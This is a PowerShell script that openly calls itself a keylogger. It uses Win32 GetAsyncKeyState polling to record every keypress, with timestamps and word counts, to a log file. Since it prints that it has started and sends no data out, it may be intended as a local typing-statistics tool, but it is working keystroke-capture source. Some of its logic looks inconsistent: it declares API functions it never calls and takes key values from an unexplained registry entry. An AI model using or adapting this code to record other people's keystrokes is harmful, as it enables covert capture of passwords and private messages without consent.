## function
function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt") 
{
  # API declaration
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
  
  # output file path
  $null = New-Item -Path $logPath -ItemType File -Force
  
  # buf
  $lst = New-Object System.Collections.ArrayList
  $buf = ''
  
  try
  {
    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
    Write-Host 'Output log to .. ' $logPath
    
    [System.IO.File]::AppendAllText($logPath, "key`ttime`tcount`r`n", $C_Encode)
    
    while ($true) {
      Start-Sleep -Milliseconds $C_waittime
      $starttime = Get-Date
      $i = 0
      $flag = $true
      
      while ($flag) {
        for ($btKeyCode = 0; $btKeyCode -le 254; $btKeyCode++) {
          ## get key state
          $keystate = $API::GetAsyncKeyState($btKeyCode)
          
          ## if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock
            $val = (Get-ItemProperty -path 'HKCU:\Software\GetKeypressValue').KeypressValue
            
            if($val.length -le 1){
              $buf = $buf + $val
              $i = $i + 1
            }else{
              if($buf -ne ""){
                $cnt = $lst.Add($buf)
              }
              if($C_exclusion_words -notcontains $val){
                if($val.length -ne 0){
                  $cnt = $lst.Add($val)
                  $i = $i + 1
                }
              }
              $buf = ""
            }
          }
          $endtime = Get-Date
          $secondstosleep = [int]($C_interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      $lst_ary = $lst.ToArray()
      $lst_str = [string]::Join(",",$lst_ary)
      [System.IO.File]::AppendAllText($logPath, $endtime.ToString($C_dateformat), $C_Encode)
      [System.IO.File]::AppendAllText($logPath, "`t" + $i, $C_Encode)
      [System.IO.File]::AppendAllText($logPath, "`t" + $lst_str, $C_Encode) 
      [System.IO.File]::AppendAllText($logPath, "`r`n", $C_Encode)
      $i = 0
      $buf = ''
      $val_pre = ''
      $lst.Clear()
    }
  }
  finally
  { 
    $lst += $buf
    $lst_ary = $lst.ToArray()
    $lst_str = [string]::Join(",",$lst_ary)
    [System.IO.File]::AppendAllText($logPath, $endtime.ToString($C_dateformat), $C_Encode)
    [System.IO.File]::AppendAllText($logPath, "`t" + $i, $C_Encode)
    [System.IO.File]::AppendAllText($logPath, "`t" + $lst_str, $C_Encode) 
    [System.IO.File]::AppendAllText($logPath, "`r`n", $C_Encode)
    notepad $logPath
  }
}

## ---------------------------------------------------- // entry point
## entry point
$project_name = split-path $PWD.path -leaf
$config = "./$project_name.config.ps1"
Write-Host "get config from $config"

## include configs
. $config

Log-Keystrokes($C_output_path)
